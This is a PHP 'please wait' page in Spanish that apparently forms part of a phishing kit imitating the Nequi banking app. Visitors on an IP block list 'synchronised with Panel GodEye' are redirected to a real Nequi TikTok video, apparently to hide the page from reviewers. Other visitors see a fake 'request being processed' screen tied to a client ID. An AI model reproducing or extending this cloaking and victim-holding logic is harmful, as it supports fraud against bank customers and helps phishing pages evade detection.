<?php
if (session_status() === PHP_SESSION_NONE) { session_start(); }
include '../../db.php';
$config = include '../../config.php';

// Obtener la IP del cliente
$ip_cliente = $_SERVER['REMOTE_ADDR'];

// Verificar si la IP está en la lista negra (Sincronizado con Panel GodEye)
$sql = "SELECT COUNT(*) as count FROM blocked_ips WHERE ip = :ip";
$stmt = $conn->prepare($sql);
$stmt->execute(['ip' => $ip_cliente]);
$row = $stmt->fetch(PDO::FETCH_ASSOC);

if ($row['count'] > 0) {
    // Si la IP está en la lista negra, redirigir
    header("Location: https://www.tiktok.com/@appnequi_/video/7424178986713926917?is_from_webapp=1&sender_device=pc&web_id=7426314577082500613");
    exit();
}

// Verificar si se ha pasado un ID por la URL
if (isset($_GET['id'])) {
    $cliente_id = $_GET['id'];
} else {
    // Manejar el caso donde no se pasa un ID
    header("Location: error.php");
    exit();
}

// $conn = null;
?>


<!DOCTYPE html>
<html lang="es">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Página de Espera</title>
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script> <!-- Asegúrate de incluir jQuery -->
    <script type="text/javascript">
        const clienteId = <?php echo json_encode($cliente_id); ?>;
    </script>
    <script type="text/javascript" src="config/js/scripts.js"></script>
    <link rel="stylesheet" href="config/css/espera.css">
</head>

<body>
    <div>
        <center><img src="config/img/giphy.webp" alt="" class="gif"></center>
        <p>Su solicitud esta siendo procesada</p>
        <p>esto puede tardar de 1 a 5 minutos.</p>
    </div>
</body>

</html>
